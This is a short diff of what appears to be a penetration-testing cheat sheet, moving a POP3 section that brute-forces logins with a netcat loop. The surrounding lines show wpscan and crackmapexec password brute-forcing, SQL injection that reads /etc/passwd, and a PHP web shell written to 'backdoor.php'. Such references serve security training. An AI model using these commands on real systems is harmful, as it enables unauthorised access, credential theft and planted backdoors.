@@ -612,6 +612,14 @@ wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/word
 - (Linux) Reading file attempt ➡️ `?id=1 union all select 1, 2, load_file('/etc/passwd')`
 - (Windows) Writing file attempt  ➡️ `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/ww/html/backdoor.php'`
 
+## TCP Port 110/995 (POP3)
+
+```bash
+for user in $(cat users.txt); 
+do ( echo USER ${user}; sleep 2s; echo PASS password; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $IP 110;
+done
+```
+
 ## TCP Port 445 (SMB - Samba)
 
 - Listing directories: `smbclient -L //<IP>/<Sharename> -U "username%password"`
@@ -632,14 +640,6 @@ wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/word
     
 - Enumerating shares: `crackmapexec smb $TARGET --shares`
 - Bruteforce usernames and passwords: `crackmapexec smb $IP -u usernames.txt -p passwords.txt`
-
-## TCP Port 110/995 (POP3)
-
-```bash
-for user in $(cat users.txt); 
-do ( echo USER ${user}; sleep 2s; echo PASS password; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $IP 110;
-done
-```
 
 ## TCP Port 389 (LDAP)
 
